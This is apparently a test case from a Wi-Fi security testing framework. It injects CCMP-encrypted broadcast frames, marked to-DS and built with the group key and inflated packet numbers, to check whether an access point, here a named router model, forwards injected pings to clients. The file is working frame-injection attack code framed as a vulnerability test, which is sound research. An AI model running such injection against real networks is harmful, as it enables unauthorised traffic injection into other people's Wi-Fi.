# Import dependencies and libraries.
from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test
from dependencies.libwifi.crypto import encrypt_ccmp

class GroupToAp(Test):
	"""Send a group-addressed frame towards the AP. Tested against RT-AC51U running Padavan firmware."""
	name = "group-tods"
	kind = Test.Supplicant

	def __init__(self):
		"""Initialization of the sequential actions defining the test case."""
		super().__init__([
			# First get an IP so we can easily test the attack.
			Action(trigger=Trigger.Connected, action=Action.GetIp),

			# After that inject unicast ICMP ping in multiple broadcast frames.
			Action(trigger=Trigger.Connected, action=Action.Function),

			# Monitor for ICMP ping replies to our IP address.
			Action(trigger=Trigger.NoTrigger, action=Action.Receive),

			# Stop the test case once a reply has been received.
			Action(trigger=Trigger.Received, action=Action.Terminate)
		])


	def inject_as_group(self, station):
		# Against the RT-AC51U addr3 had to be the BSS for encrypted frames. This means at the Ethernet
		# layer the AP will process the frame. And at the IP layer the frame is then forwarded to the client.
		# (Strangely, with plaintext frames addr3 could be the final destination. Might be due to how the
		#  AP looks for the key that must be used to decrypted it? Or are clients directly process the
		#  plaintext frame in that case?)
		header = station.get_header()
		header.addr1 = "ff:ff:ff:ff:ff:ff"
		header.addr2 = station.mac
		header.addr3 = station.bss

		# Using a non-default TID means there's a higher chance that the Packet Number is still valid
		header.TID = 2
		# Another extra measure to make sure the Packet Number will be valid
		station.gtk_seq += 50

		# We need to set to-DS so the AP *might* process broadcast frames. This also prevents clients
		# from directly processing the broadcast frames (we want clients to ignore the inject frame
		# because we are testing the AP!).
		header.FCfield = "to-DS"

		# FIXME: Take into account the actual netmask of the network
		ipaddr = station.peerip.split(".")
		for i in range(1, 255):
			ipaddr[3] = str(i)
			frame = header/LLC()/SNAP()/IP(src=station.ip, dst=".".join(ipaddr))/ICMP()/Raw(b"icmp_ping_test")

			if i == 1:
				log(STATUS, "Will inject encrypted frames of the form: " + repr(frame))

			# FIXME: The framework doesn't disable hardware encryption, is this an issue?
			frame = encrypt_ccmp(frame, station.gtk, station.gtk_seq, keyid=station.gtk_idx)
			station.inject_mon(frame)

			station.gtk_seq += 5

		log(STATUS, f"Done injecting. Used GTK={station.gtk} with last PN={station.gtk_seq}")


	def receive(self, station, frame):
		if ICMP in frame and frame[IP].dst == station.ip and frame[ICMP].type == 0 \
			and b"icmp_ping_test" in raw(frame):
			log(STATUS, f"Received frame: " + repr(frame))
			log(STATUS, "Got an ICMP reply!", color="green")
			return True


	def generate(self, station):
		"""Generate the test case by configuring the defined actions."""
		self.actions[1].set_function(self.inject_as_group)
		self.actions[2].set_receive(self.receive, eth=True)
		self.actions[3].set_terminate(delay=1)

